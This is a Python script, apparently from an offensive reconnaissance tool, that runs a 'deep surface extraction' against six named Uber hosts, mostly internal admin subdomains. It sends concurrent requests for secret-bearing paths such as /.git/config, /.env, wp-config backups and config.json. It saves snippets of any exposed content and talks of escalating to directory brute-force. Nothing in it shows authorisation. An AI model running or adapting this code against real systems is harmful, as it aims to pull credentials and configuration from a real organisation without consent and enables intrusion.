import asyncio
import json
from aura.core.async_requester import AsyncRequester
from aura.ui.formatter import ZenithFormatter

async def targeted_extraction():
    formatter = ZenithFormatter()
    formatter.banner("Uber Deep Surface Extraction")
    
    # High-value targets from DNS validation
    targets = [
        "backup.uber.com",
        "yolo.uberinternal.com",
        "newsroomadmin.uberinternal.com",
        "blogadmin.uberinternal.com",
        "team.uberinternal.com",
        "outages.uberinternal.com"
    ]
    
    paths = [
        "/",
        "/.git/config",
        "/.env",
        "/wp-config.php.bak",
        "/config.json",
        "/admin",
        "/.well-known/security.txt",
        "/robots.txt",
        "/sitemap.xml"
    ]
    
    async with AsyncRequester(concurrency_limit=20, timeout=10) as requester:
        formatter.phase_banner("Targeted Extraction", f"Probing {len(targets) * len(paths)} critical nodes...")
        
        requests = []
        for t in targets:
            for p in paths:
                requests.append({"method": "GET", "url": f"https://{t}{p}", "meta": {"target": t, "path": p}})
        
        results = await requester.fetch_all(requests)
        
        findings = []
        for req, resp in zip(requests, results):
            if resp and resp.status_code in [200, 301, 302, 401, 403]:
                # We specifically look for 200 OK on sensitive paths
                if resp.status_code == 200:
                    print(f"  [bold green][🔥] {req['url']} (Size: {len(resp.text)})[/bold green]")
                    findings.append({
                        "url": req["url"],
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "snippet": resp.text[:200]
                    })
                else:
                    print(f"  [yellow][{resp.status_code}] {req['url']}[/yellow]")

    if findings:
        with open("reports/deep_strike_findings.json", "w") as f:
            json.dump(findings, f, indent=4)
        print(f"\n[✓] Deep strike complete. CRITICAL FINDINGS SAVED.")
    else:
        print("\n[!] No direct sensitivity leaks found on basic paths. Escalating to directory brute-force...")

if __name__ == "__main__":
    asyncio.run(targeted_extraction())
